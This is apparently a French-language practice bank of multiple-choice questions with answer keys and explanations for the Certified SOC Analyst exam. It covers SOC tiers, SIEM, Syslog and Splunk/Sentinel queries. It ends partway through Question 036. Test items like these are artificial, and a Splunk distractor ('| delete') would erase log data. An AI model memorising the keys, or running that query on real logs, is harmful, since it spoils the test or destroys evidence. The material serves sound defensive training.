# CERTIFIED SOC ANALYST (CSA)

## BANQUE DE QCM ET SIMULATION D'EXAMEN

**200+ QUESTIONS CORRIGÉES ET EXPLIQUÉES** — Guide professionnel de préparation à la certification EC-Council — *ÉDITION FRANÇAISE – 2026*

> **Avertissement.** Ce document contient exclusivement des questions d'entraînement originales, rédigées à partir des domaines de compétences publiés pour la certification Certified SOC Analyst (CSA) et de la documentation technique de référence (MITRE ATT&CK, NIST, Microsoft Learn, éditeurs SIEM/EDR). Il ne s'agit en aucun cas de questions réelles, confidentielles ou divulguées de l'examen EC-Council. Ce guide n'est ni affilié, ni approuvé par EC-Council. CSA et Certified SOC Analyst sont des marques d'EC-Council.

## Table des matières

- [La certification CSA en bref](#la-certification-csa-en-bref)
- [Module 1 – SOC Fundamentals](#module-1--soc-fundamentals)
- [Module 2 – SIEM and Log Management](#module-2--siem-and-log-management)
- [Module 3 – Network Security Monitoring](#module-3--network-security-monitoring)
- [Module 4 – Threat Intelligence](#module-4--threat-intelligence)
- [Module 5 – Incident Detection and Response](#module-5--incident-detection-and-response)
- [Module 6 – Endpoint Security and Malware Analysis](#module-6--endpoint-security-and-malware-analysis)
- [Module 7 – Vulnerability Management and Attack Techniques](#module-7--vulnerability-management-and-attack-techniques)
- [Module 8 – Threat Hunting and Detection Engineering](#module-8--threat-hunting-and-detection-engineering)
- [Module 9 – Cloud Security and Identity Monitoring](#module-9--cloud-security-and-identity-monitoring)
- [Module 10 – SOC Reporting and Operational Excellence](#module-10--soc-reporting-and-operational-excellence)
- [Simulation d'examen](#simulation-dexamen-final)
- [Grille de réponses](#grille-de-réponses)
- [Notation](#notation-et-interprétation-du-score)
- [Corrigé](#corrigé-de-la-simulation-dexamen)
- [Bibliographie](#bibliographie)

## La certification CSA en bref

| Élément | Information |
|---|---|
| Code d'examen | 312-39 |
| Version du programme | CSA v2 (la v1 a été retirée en 2026 selon les sources tierces consultées) |
| Format | 100 questions à choix multiples |
| Durée | 3 heures |
| Seuil de réussite | 70 % (peut varier selon la forme d'examen) |
| Modalité | ECC Exam Portal (en ligne surveillé) ou centre agréé |

| # | Domaine CSA v2 | Poids indicatif |
|---|---|---|
| 1 | Security Operations and Management | 5 % |
| 2 | Understanding Cyber Threats, IoCs, and Attack Methodology | 8 % |
| 3 | Log Management | 15 % |
| 4 | Incident Detection and Triage | 25 % |
| 5 | Proactive Threat Detection | 12 % |
| 6 | Incident Response | 25 % |
| 7 | Forensic Investigation and Malware Analysis | 5 % |
| 8 | SOC for Cloud Environments | 5 % |

| Module du guide | Domaine(s) CSA v2 |
|---|---|
| Module 1 – SOC Fundamentals | D1 Security Operations and Management |
| Module 2 – SIEM and Log Management | D3 Log Management ; D4 Incident Detection and Triage |
| Module 3 – Network Security Monitoring | D2 Cyber Threats, IoCs and Attack Methodology ; D4 Incident Detection and Triage |
| Module 4 – Threat Intelligence | D5 Proactive Threat Detection |
| Module 5 – Incident Detection and Response | D4 Incident Detection and Triage ; D6 Incident Response ; D7 Forensic Investigation |
| Module 6 – Endpoint Security and Malware Analysis | D3 Log Management ; D7 Forensic Investigation and Malware Analysis |
| Module 7 – Vulnerability Management and Attack Techniques | D2 Cyber Threats, IoCs and Attack Methodology |
| Module 8 – Threat Hunting and Detection Engineering | D5 Proactive Threat Detection ; D4 Incident Detection and Triage |
| Module 9 – Cloud Security and Identity Monitoring | D8 SOC for Cloud Environments |
| Module 10 – SOC Reporting and Operational Excellence | D1 Security Operations and Management ; D6 Incident Response |

## Module 1 – SOC Fundamentals

### Question 001 – [Niveau : Fondamental]

Quelle définition décrit le mieux la mission principale d'un Security Operations Center (SOC) ?

- **A.** Réaliser des tests d'intrusion et des audits de conformité annuels pour le compte de la direction générale, puis en présenter les résultats.
- **B.** Gérer exclusivement le parc de postes de travail et le support aux utilisateurs.
- **C.** Surveiller en continu le système d'information, détecter, analyser et répondre aux incidents de sécurité.
- **D.** Développer les applications métier de l'entreprise selon des pratiques DevSecOps.

**Réponse correcte : C**

> **Explication technique :** Le SOC est une fonction centralisée combinant personnes, processus et technologies. Sa mission est la surveillance continue (souvent 24/7), la détection des menaces, l'analyse des alertes et la coordination de la réponse aux incidents. Le support utilisateur relève du helpdesk et les tests d'intrusion d'une équipe offensive (Red Team ou prestataire).
>
> *Compétence évaluée : SOC Fundamentals / Mission du SOC.*

### Question 002 – [Niveau : Fondamental]

Dans un SOC organisé en niveaux, quelle est la responsabilité principale d'un analyste Tier 1 ?

- **A.** Réaliser le reverse engineering des échantillons de malware avancés.
- **B.** Définir la stratégie de sécurité et le budget du SOC.
- **C.** Concevoir l'architecture du SIEM, développer les connecteurs de collecte et valider seul la mise en production des nouvelles règles.
- **D.** Surveiller les alertes, effectuer le triage initial et escalader les cas avérés ou complexes.

**Réponse correcte : D**

> **Explication technique :** L'analyste Tier 1 (L1) est en première ligne : il surveille la console SIEM/EDR, qualifie les alertes (vrai ou faux positif), enrichit les données de base, documente le ticket et escalade vers le Tier 2 selon les procédures. Le reverse engineering relève du Tier 3 et la stratégie du SOC Manager.
>
> *Compétence évaluée : SOC Fundamentals / Organisation par niveaux.*

### Question 003 – [Niveau : Fondamental]

Quels sont les trois piliers fondamentaux sur lesquels repose un SOC efficace ?

- **A.** La conformité, l'audit et l'assurance.
- **B.** Les personnes, les processus et la technologie.
- **C.** Le réseau, le stockage et la virtualisation.
- **D.** Le pare-feu, l'antivirus et le proxy.

**Réponse correcte : B**

> **Explication technique :** Le modèle « People, Process, Technology » est la référence pour concevoir un SOC. Sans analystes compétents, sans processus documentés (playbooks, escalade, SLA) et sans outils adaptés (SIEM, EDR, SOAR, TIP), le SOC ne peut pas fonctionner de manière fiable. Les outils cités dans les autres propositions ne sont que des composants technologiques.
>
> *Compétence évaluée : SOC Fundamentals / Composantes du SOC.*

### Question 004 – [Niveau : Fondamental]

Une PME ne dispose ni du budget ni des compétences pour opérer un SOC interne 24/7. Elle confie la surveillance de ses journaux à un prestataire externe qui fournit plateforme et analystes. De quel modèle s'agit-il ?

- **A.** SOC as a Service (SOCaaS) / SOC externalisé auprès d'un MSSP.
- **B.** SOC interne dédié (in-house).
- **C.** SOC virtuel composé uniquement d'employés internes à temps partiel.
- **D.** SOC de commandement (Command SOC) supervisant plusieurs SOC régionaux.

**Réponse correcte : A**

> **Explication technique :** Dans le modèle SOCaaS ou MSSP, un fournisseur externe met à disposition la technologie, les analystes et les processus de surveillance, souvent par abonnement. C'est une option adaptée aux organisations qui ne peuvent pas financer un SOC interne 24/7. Le Command SOC coordonne plusieurs SOC dans les grandes organisations.
>
> *Compétence évaluée : SOC Fundamentals / Modèles de SOC.*

### Question 005 – [Niveau : Fondamental]

Comment distingue-t-on un événement de sécurité d'un incident de sécurité ?

- **A.** Un événement est toute occurrence observable ; un incident est un événement qui viole ou menace réellement la politique de sécurité.
- **B.** Un événement est toujours malveillant, alors qu'un incident peut être bénin.
- **C.** Il n'existe aucune différence : les deux termes sont strictement synonymes.
- **D.** Un incident est un événement de sévérité élevée remonté par un IDS, alors qu'un événement correspond à toute alerte de sévérité faible du SIEM.

**Réponse correcte : A**

> **Explication technique :** Selon le NIST (SP 800-61), un événement est toute occurrence observable dans un système ou un réseau (connexion, requête, échec d'authentification). Un incident est une violation, ou une menace imminente de violation, des politiques de sécurité. Le rôle du SOC est précisément de déterminer quels événements constituent des incidents.
>
> *Compétence évaluée : SOC Fundamentals / Terminologie.*

### Question 006 – [Niveau : Fondamental]

Quel outil d'un SOC est principalement conçu pour automatiser et orchestrer les actions de réponse à l'aide de playbooks ?

- **A.** SIEM (Security Information and Event Management).
- **B.** DLP (Data Loss Prevention).
- **C.** WAF (Web Application Firewall).
- **D.** SOAR (Security Orchestration, Automation and Response).

**Réponse correcte : D**

> **Explication technique :** Le SOAR orchestre des actions entre plusieurs outils (enrichissement IOC, blocage d'IP, isolation d'hôte, création de ticket) via des playbooks automatisés. Le SIEM collecte, corrèle et alerte, mais l'automatisation avancée de la réponse est la fonction propre du SOAR (ex. Microsoft Sentinel playbooks sur Logic Apps, Splunk SOAR, Cortex XSOAR).
>
> *Compétence évaluée : SOC Fundamentals / Outils du SOC.*

### Question 007 – [Niveau : Intermédiaire]

Un analyste Tier 1 escalade une alerte confirmée d'exécution de script suspect sur un serveur. Quelle activité relève typiquement du Tier 2 ?

- **A.** Rédiger la politique de sécurité générale de l'entreprise.
- **B.** Acheter une nouvelle licence EDR pour le serveur concerné.
- **C.** Mener l'investigation approfondie, déterminer le périmètre de la compromission et coordonner les actions de confinement.
- **D.** Clôturer le ticket après avoir vérifié que l'antivirus a bien supprimé le script, puisque l'alerte a déjà été qualifiée par le Tier 1.

**Réponse correcte : C**

> **Explication technique :** Le Tier 2 (Incident Responder) reçoit les incidents escaladés. Il corrèle les sources (EDR, SIEM, proxy, AD), reconstitue la chronologie, évalue le périmètre (autres hôtes, comptes touchés) et recommande ou applique les mesures de confinement. Le Tier 3 intervient sur les cas les plus complexes (threat hunting, analyse de malware, forensic avancé).
>
> *Compétence évaluée : SOC Fundamentals / Rôles Tier 2.*

### Question 008 – [Niveau : Intermédiaire]

Quelle mission est généralement confiée à un analyste SOC Tier 3 ?

- **A.** Assurer uniquement la permanence téléphonique de nuit.
- **B.** Mener des campagnes de threat hunting proactives et analyser des menaces avancées non détectées par les outils.
- **C.** Traiter en premier niveau la file d'attente des alertes de faible sévérité afin de soulager les analystes Tier 1 pendant les pics d'activité.
- **D.** Réinitialiser les mots de passe des utilisateurs bloqués.

**Réponse correcte : B**

> **Explication technique :** Le Tier 3 regroupe des experts (threat hunters, analystes malware, forensic) qui recherchent proactivement des menaces furtives, développent de nouvelles détections et apportent leur expertise sur les incidents majeurs. La réinitialisation de mots de passe relève du support et le traitement des alertes simples du Tier 1.
>
> *Compétence évaluée : SOC Fundamentals / Rôles Tier 3.*

### Question 009 – [Niveau : Intermédiaire]

Quel est l'ordre logique du flux de traitement d'une alerte dans un SOC ?

- **A.** Collecte des données, détection, triage, investigation, réponse, puis retour d'expérience.
- **B.** Triage, collecte, réponse, détection, investigation, puis archivage.
- **C.** Investigation, réponse, collecte, triage, détection, puis clôture.
- **D.** Détection, réponse immédiate, collecte des preuves, triage, investigation, puis retour d'expérience.

**Réponse correcte : A**

> **Explication technique :** Le flux opérationnel commence par la collecte (logs, télémétrie), puis la détection (règles, analytiques), le triage (qualification et priorisation), l'investigation (périmètre, cause), la réponse (confinement, éradication, restauration) et enfin le retour d'expérience pour améliorer les détections et les processus.
>
> *Compétence évaluée : SOC Fundamentals / Processus de surveillance.*

### Question 010 – [Niveau : Intermédiaire]

Un SOC s'auto-évalue avec le modèle SOC-CMM. Quels domaines ce modèle évalue-t-il ?

- **A.** Identify, Protect, Detect, Respond et Recover uniquement.
- **B.** Business, People, Process, Technology et Services.
- **C.** Confidentialité, Intégrité, Disponibilité, Traçabilité et Authenticité.
- **D.** Reconnaissance, Weaponization, Delivery, Exploitation et Installation.

**Réponse correcte : B**

> **Explication technique :** Le SOC-CMM (SOC Capability Maturity Model) évalue la maturité et la capacité d'un SOC selon cinq domaines : Business, People, Process, Technology et Services, avec des niveaux de maturité gradués. Les fonctions Identify/Protect/Detect/Respond/Recover appartiennent au NIST CSF et les étapes Reconnaissance à Installation à la Cyber Kill Chain.
>
> *Compétence évaluée : SOC Fundamentals / SOC Maturity Model.*

### Question 011 – [Niveau : Intermédiaire]

Une organisation conserve une équipe SOC interne pendant les heures ouvrées et confie la surveillance de nuit et du week-end à un MSSP. Quel modèle opérationnel est mis en œuvre ?

- **A.** Un NOC (Network Operations Center) converti.
- **B.** Un SOC entièrement interne.
- **C.** Un SOC hybride (co-managé).
- **D.** Un SOC virtuel sans aucune plateforme.

**Réponse correcte : C**

> **Explication technique :** Le modèle hybride ou co-managé combine des ressources internes et externes. Il permet de garder la connaissance du contexte métier en interne tout en assurant une couverture 24/7 grâce au prestataire. Il nécessite des processus d'escalade et de passation clairement définis entre les deux équipes.
>
> *Compétence évaluée : SOC Fundamentals / Modèle hybride.*

### Question 012 – [Niveau : Intermédiaire]

Quelle différence principale existe entre un NOC et un SOC ?

- **A.** Le NOC surveille les menaces externes provenant d'Internet, tandis que le SOC surveille uniquement les menaces internes et les employés malveillants.
- **B.** Le NOC traite uniquement les incidents de sécurité, le SOC uniquement les pannes matérielles.
- **C.** Le SOC gère les licences logicielles, le NOC gère les incidents de sécurité.
- **D.** Le NOC se concentre sur la disponibilité et la performance du réseau, le SOC sur la détection et la réponse aux menaces de sécurité.

**Réponse correcte : D**

> **Explication technique :** Le NOC (Network Operations Center) surveille la santé de l'infrastructure (latence, pannes, capacité). Le SOC surveille les menaces et incidents de sécurité. Les deux collaborent souvent : une saturation de bande passante peut par exemple relever d'une attaque DDoS que le SOC doit analyser.
>
> *Compétence évaluée : SOC Fundamentals / SOC vs NOC.*

### Question 013 – [Niveau : Intermédiaire]

Un SOC reçoit 15 000 alertes par jour et les analystes Tier 1 n'en traitent qu'une fraction. Quel phénomène décrit cette situation et quel risque induit-elle ?

- **A.** Le « threat hunting » réactif ; il augmente mécaniquement la couverture de détection et réduit le nombre de faux positifs.
- **B.** Le « log rotation » ; il entraîne une perte de licences SIEM.
- **C.** Le « sandboxing » ; il ralentit l'exécution des postes.
- **D.** L'« alert fatigue » ; elle augmente le risque que de vraies attaques soient ignorées.

**Réponse correcte : D**

> **Explication technique :** L'alert fatigue survient quand le volume d'alertes, souvent dominé par les faux positifs, dépasse la capacité des analystes. Ceux-ci deviennent moins attentifs et des vrais positifs peuvent passer inaperçus. Les remèdes incluent le tuning des règles, l'agrégation des alertes en incidents, l'automatisation (SOAR) et l'approche Risk-Based Alerting.
>
> *Compétence évaluée : SOC Fundamentals / Gestion des alertes.*

### Question 014 – [Niveau : Intermédiaire]

Une règle SIEM n'a pas déclenché d'alerte alors qu'une attaque réelle par brute force a eu lieu. Comment qualifie-t-on ce résultat ?

- **A.** Un vrai positif.
- **B.** Un vrai négatif.
- **C.** Un faux négatif.
- **D.** Un faux positif.

**Réponse correcte : C**

> **Explication technique :** Un faux négatif correspond à une activité malveillante réelle qui n'a pas été détectée. C'est le cas le plus dangereux, car il donne une fausse impression de sécurité. Un faux positif est une alerte déclenchée sur une activité légitime ; un vrai positif est une alerte correcte sur une activité malveillante.
>
> *Compétence évaluée : SOC Fundamentals / Indicateurs de détection.*

### Question 015 – [Niveau : Intermédiaire]

Quelle est la relation habituelle entre le SOC et le CSIRT dans une grande organisation ?

- **A.** Le SOC détecte et qualifie les incidents, puis le CSIRT prend en charge la gestion des incidents majeurs et la coordination de la réponse.
- **B.** Le SOC et le CSIRT ne communiquent jamais afin de préserver leur indépendance.
- **C.** Le CSIRT surveille les alertes en temps réel, tandis que le SOC se limite à l'administration des pare-feux et à la rédaction des politiques de sécurité.
- **D.** Le CSIRT est une simple base de données de vulnérabilités consultée par le SOC.

**Réponse correcte : A**

> **Explication technique :** Dans de nombreuses organisations, le SOC assure la surveillance et la détection, puis transfère les incidents significatifs au CSIRT (Computer Security Incident Response Team). Celui-ci coordonne la réponse, la communication avec la direction, le juridique et les parties externes. Dans les petites structures, les deux fonctions peuvent être fusionnées.
>
> *Compétence évaluée : SOC Fundamentals / Collaboration CSIRT.*

### Question 016 – [Niveau : Avancé / Expert]

Quel élément doit prioritairement guider la définition des cas d'usage de détection d'un nouveau SOC ?

- **A.** Le nombre de licences disponibles sur le SIEM uniquement.
- **B.** L'analyse des risques de l'organisation, ses actifs critiques et les menaces qui la ciblent.
- **C.** Les préférences personnelles des analystes Tier 1.
- **D.** La liste exhaustive de toutes les règles proposées par l'éditeur du SIEM, activées sans distinction.

**Réponse correcte : B**

> **Explication technique :** Un SOC efficace adopte une approche orientée risques : il identifie les « joyaux de la couronne » (actifs critiques), les menaces pertinentes pour son secteur (threat profiling) et construit ses cas d'usage en conséquence. Activer toutes les règles par défaut sans contexte génère du bruit et de l'alert fatigue.
>
> *Compétence évaluée : SOC Fundamentals / Threat landscape.*

### Question 017 – [Niveau : Avancé / Expert]

Le RSSI demande de démontrer la valeur du SOC. Quelle approche est la plus pertinente ?

- **A.** Comparer le prix du SIEM avec celui des concurrents.
- **B.** Présenter le volume total de journaux ingérés par jour et le nombre de règles de corrélation activées, qui reflètent directement le niveau de protection.
- **C.** Mesurer la couverture des techniques MITRE ATT&CK prioritaires, le MTTD, le MTTR et le taux de faux positifs, puis présenter leur évolution.
- **D.** Présenter le nombre d'analystes recrutés au cours de l'année.

**Réponse correcte : C**

> **Explication technique :** La valeur d'un SOC se démontre par des indicateurs de résultat : couverture de détection mappée sur ATT&CK, délais de détection et de réponse, qualité des alertes et réduction de l'impact des incidents. Le volume de logs ingérés est un indicateur de coût et d'activité, pas d'efficacité.
>
> *Compétence évaluée : SOC Fundamentals / Gouvernance et efficacité.*

### Question 018 – [Niveau : Avancé / Expert]

Un SOC dispose d'un SIEM et d'un EDR, mais un attaquant a exfiltré des données via un serveur Linux non couvert. Quel concept de surveillance cet incident met-il en évidence ?

- **A.** L'inutilité d'un EDR face aux serveurs.
- **B.** Un excès de règles de corrélation dans le SIEM, qui a saturé les analystes et masqué l'alerte d'exfiltration générée par le serveur Linux.
- **C.** Un problème lié exclusivement à la politique de mots de passe.
- **D.** Un angle mort de visibilité : chaque source critique doit être inventoriée et intégrée (logs, endpoint, réseau).

**Réponse correcte : D**

> **Explication technique :** La « SOC visibility triad » (Gartner) combine SIEM/logs, EDR (endpoint) et NDR (réseau). Un SOC doit maintenir un inventaire des actifs et vérifier que chacun envoie bien sa télémétrie. Un serveur non intégré constitue un angle mort exploitable. Le suivi de la couverture des sources de logs fait partie des contrôles de santé du SIEM.
>
> *Compétence évaluée : SOC Fundamentals / Architecture de visibilité.*

### Question 019 – [Niveau : Avancé / Expert]

Un SOC envisage de configurer un playbook SOAR qui désactive automatiquement tout compte Entra ID dès qu'une alerte « risque utilisateur élevé » apparaît. Quel est le principal point de vigilance ?

- **A.** Étendre l'action à tous les comptes du même service et à leurs managers, afin de contenir une éventuelle compromission latérale.
- **B.** Évaluer l'impact des faux positifs et prévoir des exceptions (comptes d'urgence) et une validation humaine pour les comptes critiques.
- **C.** Supprimer définitivement le compte plutôt que de le désactiver.
- **D.** Aucun : l'automatisation complète est toujours préférable à l'intervention humaine.

**Réponse correcte : B**

> **Explication technique :** L'automatisation de la réponse accélère le confinement mais peut provoquer des interruptions de service en cas de faux positif. Les bonnes pratiques consistent à exclure les comptes d'urgence, à prévoir une approbation humaine pour les actions à fort impact et à tester le playbook avant de le généraliser.
>
> *Compétence évaluée : SOC Fundamentals / Automatisation et risques.*

### Question 020 – [Niveau : Avancé / Expert]

Pourquoi les journaux collectés par le SOC doivent-ils être centralisés sur une plateforme distincte des systèmes surveillés, avec un accès restreint ?

- **A.** Pour préserver leur intégrité et leur disponibilité, car un attaquant ayant compromis un hôte cherche souvent à effacer ses traces localement.
- **B.** Pour éviter de devoir synchroniser les horloges des équipements.
- **C.** Pour réduire la charge des systèmes sources, car la journalisation locale consomme l'essentiel des ressources disque et processeur des serveurs.
- **D.** Parce que les journaux locaux ne sont jamais au format texte.

**Réponse correcte : A**

> **Explication technique :** Les attaquants effacent fréquemment les journaux locaux (Event ID 1102 sur Windows, suppression de fichiers dans /var/log sous Linux). La centralisation en quasi temps réel vers un SIEM ou un collecteur protégé, avec contrôle d'accès et éventuellement stockage immuable, garantit la disponibilité des preuves pour l'investigation et la conformité.
>
> *Compétence évaluée : SOC Fundamentals / Indépendance des journaux.*

## Module 2 – SIEM and Log Management

### Question 021 – [Niveau : Fondamental]

Quelle fonction n'est PAS une fonction native d'un SIEM ?

- **A.** La normalisation et la corrélation des événements.
- **B.** La génération d'alertes et le reporting.
- **C.** Le chiffrement des disques durs des postes de travail.
- **D.** La collecte et l'agrégation des journaux.

**Réponse correcte : C**

> **Explication technique :** Un SIEM collecte, normalise, stocke, corrèle les événements, génère des alertes et fournit des capacités de recherche et de reporting. Le chiffrement des disques relève de solutions de protection des terminaux comme BitLocker ou FileVault, gérées par l'équipe infrastructure.
>
> *Compétence évaluée : SIEM / Fonctions de base.*

### Question 022 – [Niveau : Fondamental]

Quel est l'objectif de la normalisation des journaux dans un SIEM ?

- **A.** Filtrer les journaux de faible sévérité et compresser les autres afin de réduire le volume et le coût de la licence.
- **B.** Convertir des journaux de formats hétérogènes en un schéma commun afin de pouvoir les rechercher et les corréler.
- **C.** Chiffrer les journaux pendant leur transfert.
- **D.** Compresser les journaux pour réduire le coût de stockage.

**Réponse correcte : B**

> **Explication technique :** Chaque source (pare-feu, Windows, proxy, cloud) produit des formats différents. La normalisation mappe les champs vers un schéma unifié (ex. src_ip, user, action), comme le CIM de Splunk, l'ECS d'Elastic ou l'ASIM de Microsoft Sentinel. Une même règle peut ainsi s'appliquer à plusieurs sources.
>
> *Compétence évaluée : Log Management / Normalisation.*

### Question 023 – [Niveau : Fondamental]

Quel port et quel protocole sont utilisés par défaut par le Syslog traditionnel ?

- **A.** UDP 514.
- **B.** TCP 22.
- **C.** TCP 3389.
- **D.** UDP 161.

**Réponse correcte : A**

> **Explication technique :** Le Syslog historique utilise UDP 514, sans garantie de livraison ni chiffrement. Pour la fiabilité et la confidentialité, on privilégie Syslog sur TCP ou Syslog sur TLS (port 6514, RFC 5425). UDP 161 correspond au SNMP, TCP 22 au SSH et TCP 3389 au RDP.
>
> *Compétence évaluée : Log Management / Syslog.*

### Question 024 – [Niveau : Fondamental]

Dans la norme Syslog (RFC 5424), quel niveau de sévérité correspond à la valeur 0 ?

- **A.** Warning : conditions d'avertissement.
- **B.** Informational : messages d'information.
- **C.** Debug : messages de débogage.
- **D.** Emergency : le système est inutilisable.

**Réponse correcte : D**

> **Explication technique :** Les niveaux Syslog vont de 0 à 7 : 0 Emergency, 1 Alert, 2 Critical, 3 Error, 4 Warning, 5 Notice, 6 Informational, 7 Debug. Plus la valeur est faible, plus l'événement est grave. Cette information sert à filtrer et prioriser la collecte.
>
> *Compétence évaluée : Log Management / Niveaux Syslog.*

### Question 025 – [Niveau : Fondamental]

Pourquoi la synchronisation NTP de toutes les sources de journaux est-elle essentielle pour un SOC ?

- **A.** Elle remplace la nécessité d'un parsing des journaux.
- **B.** Elle permet au SIEM de rejeter automatiquement les journaux arrivés en retard, ce qui réduit le volume ingéré et le coût de licence.
- **C.** Elle chiffre automatiquement les journaux transmis.
- **D.** Elle garantit des horodatages cohérents, indispensables à la corrélation et à la reconstitution de la chronologie d'une attaque.

**Réponse correcte : D**

> **Explication technique :** Sans horloge commune, des événements liés peuvent sembler décalés de plusieurs minutes, ce qui fausse les règles de corrélation à fenêtre temporelle et la timeline d'un incident. Il est aussi recommandé de stocker les horodatages en UTC et de vérifier la gestion des fuseaux horaires lors du parsing.
>
> *Compétence évaluée : Log Management / Synchronisation temporelle.*

### Question 026 – [Niveau : Fondamental]

Dans une architecture Splunk, quel composant est installé sur les sources pour transmettre les données aux indexeurs avec une empreinte minimale ?

- **A.** Le License Master.
- **B.** Le Universal Forwarder.
- **C.** Le Search Head.
- **D.** Le Deployment Server.

**Réponse correcte : B**

> **Explication technique :** Le Universal Forwarder est un agent léger qui collecte et transmet les données aux indexeurs. Le Heavy Forwarder peut parser et filtrer avant envoi. Le Search Head exécute les recherches SPL, et le Deployment Server distribue les configurations aux forwarders.
>
> *Compétence évaluée : SIEM / Architecture Splunk.*

### Question 027 – [Niveau : Fondamental]

Une alerte « connexion administrateur hors heures ouvrées » se déclenche chaque nuit à 2 h à cause d'un script de sauvegarde légitime. Comment qualifier ces alertes ?

- **A.** Des faux positifs.
- **B.** Des vrais positifs.
- **C.** Des vrais négatifs.
- **D.** Des faux négatifs.

**Réponse correcte : A**

> **Explication technique :** Un faux positif est une alerte déclenchée par une activité bénigne. Ici, la tâche de sauvegarde est légitime : il faut documenter l'exception et ajuster la règle (exclusion ciblée du compte de service et de l'hôte source), plutôt que de désactiver totalement la détection.
>
> *Compétence évaluée : SIEM / Faux positifs.*

### Question 028 – [Niveau : Fondamental]

Quel format de journal a été développé par ArcSight et est largement utilisé pour transmettre des événements de sécurité au SIEM via Syslog ?

- **A.** LEEF (Log Event Extended Format).
- **B.** PCAP (Packet Capture).
- **C.** CEF (Common Event Format).
- **D.** EVTX (Windows Event Log).

**Réponse correcte : C**

> **Explication technique :** Le CEF, introduit par ArcSight, est un format texte structuré en en-tête et extensions clé=valeur, utilisé par de nombreux pare-feux et solutions de sécurité. Le LEEF est le format équivalent promu par IBM QRadar. L'EVTX est le format binaire natif des journaux Windows et le PCAP un format de capture réseau.
>
> *Compétence évaluée : SIEM / Formats de journaux.*

### Question 029 – [Niveau : Intermédiaire]

Quel scénario illustre une règle de corrélation multi-sources ?

- **A.** Une alerte se déclenche après 20 échecs VPN d'un utilisateur suivis d'un succès depuis une IP listée en CTI.
- **B.** Une alerte se déclenche dès qu'un événement 4625 apparaît sur un contrôleur de domaine, quel que soit le compte concerné.
- **C.** Une alerte se déclenche à chaque redémarrage d'un poste.
- **D.** Une alerte se déclenche lorsqu'un disque du SIEM est plein.

**Réponse correcte : A**

> **Explication technique :** La corrélation associe plusieurs événements, souvent issus de sources différentes, selon une logique et une fenêtre temporelle. Combiner des échecs VPN, un succès et un enrichissement CTI réduit fortement les faux positifs par rapport à une alerte sur un événement unique.
>
> *Compétence évaluée : SIEM / Corrélation.*

### Question 030 – [Niveau : Intermédiaire]

Dans IBM QRadar, comment appelle-t-on l'entité qui regroupe les événements et flux corrélés nécessitant une investigation ?

- **A.** Un case Elastic.
- **B.** Un incident Fusion.
- **C.** Un notable event.
- **D.** Une offense (offense).

**Réponse correcte : D**

> **Explication technique :** QRadar génère des « offenses » lorsque des règles de corrélation se déclenchent. Leur magnitude est calculée à partir de la pertinence, de la sévérité et de la crédibilité. Les notable events appartiennent à Splunk Enterprise Security et Fusion est le moteur de corrélation multi-étapes de Microsoft Sentinel.
>
> *Compétence évaluée : SIEM / QRadar.*

### Question 031 – [Niveau : Intermédiaire]

Un analyste veut compter, dans Splunk, les échecs de connexion Windows par compte sur les dernières 24 heures. Quelle requête est la plus appropriée ?

- **A.** index=wineventlog EventCode=4624 earliest=-24h | stats count by Account_Name | sort - count
- **B.** index=wineventlog EventCode=4625 earliest=-24h | stats count by Account_Name | sort - count
- **C.** index=* | dedup host | head 10
- **D.** index=wineventlog EventCode=4625 | delete

**Réponse correcte : B**

> **Explication technique :** L'Event ID 4625 correspond aux échecs d'ouverture de session. La commande stats count by agrège par compte et sort - count classe par ordre décroissant pour identifier les comptes les plus ciblés. L'Event ID 4624 correspond aux succès, et la commande delete supprimerait les données au lieu de les analyser.
>
> *Compétence évaluée : SIEM / Splunk SPL.*

### Question 032 – [Niveau : Intermédiaire]

Dans Microsoft Sentinel, quel type de règle d'analyse exécute une requête KQL à intervalle défini sur une période de recherche donnée afin de générer des alertes ?

- **A.** Une watchlist.
- **B.** Une règle d'automatisation (Automation rule).
- **C.** Une règle planifiée (Scheduled query rule).
- **D.** Un classeur (Workbook).

**Réponse correcte : C**

> **Explication technique :** Les règles planifiées exécutent une requête KQL selon une fréquence (ex. toutes les 5 minutes) sur une période (ex. les 5 dernières minutes) avec un seuil. Les règles d'automatisation gèrent le tri et le déclenchement de playbooks, les workbooks servent à la visualisation et les watchlists sont des listes de référence.
>
> *Compétence évaluée : SIEM / Microsoft Sentinel.*

### Question 033 – [Niveau : Intermédiaire]

Dans Elastic Security, quel schéma de normalisation permet d'utiliser des noms de champs uniformes comme source.ip, user.name ou process.command_line ?

- **A.** CIM (Common Information Model).
- **B.** ECS (Elastic Common Schema).
- **C.** ASIM (Advanced Security Information Model).
- **D.** STIX (Structured Threat Information Expression).

**Réponse correcte : B**

> **Explication technique :** L'ECS est le schéma d'Elastic qui standardise les noms de champs entre les sources. Le CIM est son équivalent chez Splunk, l'ASIM chez Microsoft Sentinel. STIX est un langage de représentation de la threat intelligence, pas un schéma de journaux.
>
> *Compétence évaluée : SIEM / Elastic.*

### Question 034 – [Niveau : Intermédiaire]

Quel élément doit obligatoirement figurer dans la documentation d'un cas d'usage de détection ?

- **A.** L'objectif, les sources de données requises, la logique, le mapping ATT&CK et la procédure de réponse.
- **B.** Le nom de l'éditeur de la règle, sa date de création et la liste des analystes habilités à la modifier, sans autre détail.
- **C.** Le coût d'ingestion des journaux concernés uniquement.
- **D.** Uniquement le nom de la règle et la date de création.

**Réponse correcte : A**

> **Explication technique :** Un cas d'usage bien documenté décrit la menace ciblée, les prérequis en données, la logique de détection, les faux positifs connus, la sévérité, le mapping MITRE ATT&CK et le playbook de traitement. Cette documentation garantit la cohérence du triage et facilite la maintenance des règles.
>
> *Compétence évaluée : SIEM / Use cases.*

### Question 035 – [Niveau : Intermédiaire]

Une règle SIEM détecte la création d'une tâche planifiée via schtasks.exe /create pointant vers un exécutable situé dans %APPDATA%. À quelle technique MITRE ATT&CK la rattacher ?

- **A.** T1110.003 – Brute Force : Password Spraying.
- **B.** T1486 – Data Encrypted for Impact.
- **C.** T1053.005 – Scheduled Task/Job : Scheduled Task.
- **D.** T1566.001 – Phishing : Spearphishing Attachment.

**Réponse correcte : C**

> **Explication technique :** La création de tâches planifiées pour l'exécution ou la persistance correspond à la sous-technique T1053.005. L'emplacement %APPDATA% est un indicateur supplémentaire de suspicion, car les logiciels légitimes s'installent généralement dans Program Files.
>
> *Compétence évaluée : SIEM / Mapping ATT&CK.*

### Question 036 – [Niveau : Intermédiaire]

Quelle source de journal Windows est indispensable pour suivre la création de processus avec leur ligne de commande, sans Sysmon ?

- **A.** Le journal Setup avec l'événement 2.
- **B.** Le journal System avec l'événement 6005.
- **C.** Le journal Application avec l'événement 1000, qui recense chaque lancement d'exécutable et ses arguments.
